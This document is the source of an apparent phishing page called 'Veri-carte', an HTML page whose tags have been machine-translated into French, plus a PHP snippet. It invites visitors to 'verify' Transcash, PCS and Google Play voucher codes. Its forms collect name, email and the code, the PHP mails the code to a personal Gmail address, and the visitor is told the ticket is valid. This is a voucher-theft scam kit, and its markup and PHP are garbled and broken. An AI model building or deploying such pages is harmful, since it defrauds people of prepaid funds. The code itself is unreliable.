<! DOCTYPE html>
<html lang= »fr">
<tête>
    <meta charset= »UTF-8">
    <link rel= »stylesheet" href= »veri.css">
    <titre>vericarte</titre>
</tête>
<corps>
    <en-tête>
        <Nav>
            <Ul>
                <li id= »logo"><a href= »#">Veri-carte</a></li>
                <li><a href= »#pcs">PCS</un></li>
                <li><a href= »#transcash"></un<>/li>
                <li><a href= »#google_play">Google play</un></li>
                <li><a href= »#acceuil">Acceuil</un></li>

            </Ul> 
        </Nav>
        <div id= »imageprincipale">
            <h1></h1>
            <div id= »premiertrait"></div>
            <h4 id= »imp">Verifier vos carte de rechargement tout en securité..... </h4>
        </Div>

    </en-tête>
    <section id= »présentation">
        <div id= »cartedepaiement">
            <h2>Qu’es-ce qu’une carte de paiement</h2>
            <p> Un buraliste peut vendre des cartes bancaires prépayées anonymes provenant de plusieurs acteurs du marché. S’agissant des recharges des cartes bancaires prépayées, elles peuvent s’acheter chez les buralistes, qu’elles soient anonymes comme nominatives. Mais avec la loi entrée en vigueur le 1er janvier 2017, des plafonds ont été posés pour les cartes anonymes. En effet, les sommes en liquide reçues par ces professionnels sont limitées à 250 € / mois et par carte. Si vous souhaitez déposer des montants en espèces plus importants, vous devrez donc lever votre anonymat auprès de l’organisme ayant édité votre carte bancaire prépayée. Le prix des recharges de carte bancaire prépayée dans un bureau de tabac vont de 10 € ou 20 € jusqu’à 250 €, selon la carte et l’endroit où vous l’achetez.
 En dehors d’un bureau de tabac, où acheter une carte bancaire prépayée ? Un buraliste n’est pas habilité à vous demander un justificatif de domicile ou votre pièce d’identité. Ainsi, les cartes prépayées nominatives (celles qui nécessitent l’ouverture d’un compte bancaire ou d’un compte en ligne pour votre carte prépayée) ne sont pas à contracter dans un bureau de tabac, mais :
                Dans une agence bancaire, s’il s’agit d’une carte prépayée avec compte bancaire.
 Dans les commerces de proximités partenaires des acteurs du marché les éditant (presse, hypermarchés...).
 En ligne directement sur le site officiel du fournisseur ou sur celui de la banque en ligne. Vous choisissez de la récupérer immédiatement auprès d’un point de vente physique (buraliste, presse...) ou de la recevoir par voie postale en quelques jours.
            </p>
            <h2 id= »texteveri"vérification ></h2>
        </Div>
        <div id= »prestation">
            
            <div classe= »imageprestation">
                <h4></h4>
               <a href= »#transcash"><img src= »image/tn_transcash.png" alt= »transcash« /></a> 
            </Div>
            <div classe= »imageprestation">
                <h4>pcs</h4>
               <a href= »#PCS"><img src= »image/tn_pcs.png" alt= »PCS« /></a>
            </Div>
            <div classe= »imageprestation">
                <h4>google play</h4>
               <a href= »#google_play"><img src= »image/tn_google.png" alt= »google_play« /></a>
            </Div>
            
        </Div>
    </section>
    <section id= »services">
        <section id= »transcash">
            <h2>transcash</h2>
            <form method= »POST" action= »formulaire.php" >
                <espace réservé d’entrée= »  NOM" type= »text" name= »NOM" requis> 
                <espace réservé d’entrée = »E-MAIL" type= »email" name= »email" required> 
                <espace réservé d’entrée= »ENTREZ VOTRE CODE" type= »text" name= »code" required > 
                <button type= »submit">vérificateur</button>
            </forme>
        </section>
        <section id= "PCS">
            <h2>PCS</h2>
            <form method= "get" a>
                    <espace réservé d’entrée= " NOM" type= »text" name= »NOM" requis> 
                    <espace réservé d’entrée = »E-MAIL" type= »email" name= »email" required> 
                    <espace réservé d’entrée= »ENTREZ VOTRE CODE" type= »text" name= »code" required > 
                    <button type= »submit">vérificateur</button>
            </forme>
            
        </section>
        <section id= »google_play">
            <h2>Goole </h2>
            <form method= »POST" action= »formulaire.php" >
                <espace réservé d’entrée= »  NOM" type= »text" name= »NOM" requis> 
                <espace réservé d’entrée = »E-MAIL" type= »email" name= »email" required> 
                <espace réservé d’entrée= »ENTREZ VOTRE CODE" type= »text" name= »code" required > 
                <button type= »submit">vérificateur</button>
            </forme>
        </section>
         <div id= »deuxiemetrait"></div>
        
    </section>
    <pied de page>
       
        <div id= »copyrightEtIcons">
            <div id= »copyright">
                <s’étendent>© deScracth(); </durée 2015>
            </Div>
        </Div>
    </pied de page>
</corps>
</HTML>
<?php
    $msg_erreur="Erreur. Les champs suivants doivent être obligatoirement remplis :<br/>";
    $msg_ok='Votre ticket est bien valide';
    $message=$msg_erreur;
    $mail_corps="code";
    $NOM="NOM";
    $email="email";
    $destinataire='';
   $objet='verification de site';
   
$mail_corps = "code";
if (mail('franciscokenett048@gmail.com','$objet','$mail_corps');) {
    //Le mail est bien expédié
    echo '$msg_ok';
  } else {
    //Le mail n'a pas été expédié
    echo "Une erreur est survenue";
  }
?>
